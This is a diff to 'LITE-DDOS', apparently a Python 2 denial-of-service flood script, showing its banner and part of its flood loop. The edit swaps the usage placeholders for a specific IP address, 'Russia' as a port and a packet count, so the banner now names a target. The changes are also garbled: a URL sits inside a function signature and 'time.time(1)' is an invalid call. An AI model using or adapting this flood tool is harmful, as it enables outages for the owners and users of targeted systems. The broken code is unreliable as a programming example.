@@ -1,12 +1,12 @@
-import time
+import time 
 import socket
 import random
 import sys
-def usage():
+def usage(https://github.com/4L13199/LITEDDOS):
     print "\033[1;32m#########################################################"
     print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
     print "#-------------------------------------------------------#"
-    print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
+    print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<176.101.230.227> <Russia> <5000> \033[1;32m   #"
     print "#                                                       #"
     print "#\033[1;91mCreator:KeepAlive  \033[1;32m##      ###       ##                #"
     print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
@@ -28,7 +28,7 @@ def flood(victim, vport, duration):
     sent = 3000
 
     while 1:
-        if time.time() > timeout:
+        if time.time(1) > timeout:
             break
         else:
             pass
